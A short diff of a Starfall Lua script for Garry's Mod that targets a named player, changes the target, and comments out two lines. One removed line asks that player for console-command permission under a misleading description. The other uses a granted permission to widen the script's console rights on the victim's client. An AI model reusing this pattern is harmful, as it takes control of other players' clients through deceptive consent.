@@ -3,9 +3,9 @@
 --@client
 
 local IsTarget = false
-local TryAuto = false
+local TryAuto = true
 --local Target = nil --owner()
-Target = find.playersByName("fir")[1]
+Target = find.playersByName("markiz")[1]
 /*Target = find.allPlayers(function(p)
     if p:getSteamID() == "STEAM_0:1:54066003" then
         return true
@@ -23,7 +23,7 @@ local newIsPressed = true
 
 function updateAccess()
     if hasPermission("console.command") and owner() ~= player() then
-        concmd("sf_permission_cl console.command client 3")
+        --concmd("sf_permission_cl console.command client 3")
     end
 end
 
@@ -40,7 +40,7 @@ end
 
 
 local ii = false
-setupPermissionRequest({ "console.command" }, "See an example of console.command.", true)
+--setupPermissionRequest({ "console.command" }, "See an example of console.command.", true)
 local permissionSatisfied = hasPermission("console.command")
 
 
